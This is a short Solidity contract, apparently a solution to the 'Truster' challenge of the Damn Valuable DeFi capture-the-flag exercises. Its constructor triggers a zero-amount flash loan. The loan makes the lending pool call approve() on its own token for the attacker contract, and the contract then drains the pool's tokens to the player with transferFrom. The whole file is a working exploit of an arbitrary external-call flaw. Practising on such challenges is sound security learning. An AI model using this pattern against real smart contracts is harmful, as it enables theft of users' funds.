// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

contract AttackTruster {

    constructor (address player, address pool, address token, uint256 amount) {
        bytes memory encodedParamsA = abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")),address(this),amount);
        bytes memory encodedParamsFL = abi.encodeWithSelector(bytes4(keccak256("flashLoan(uint256,address,address,bytes)")),0,address(this),DamnValuableToken(token),encodedParamsA);    

        pool.call(encodedParamsFL);
        
        DamnValuableToken(token).transferFrom(pool, player, amount);
    }
}
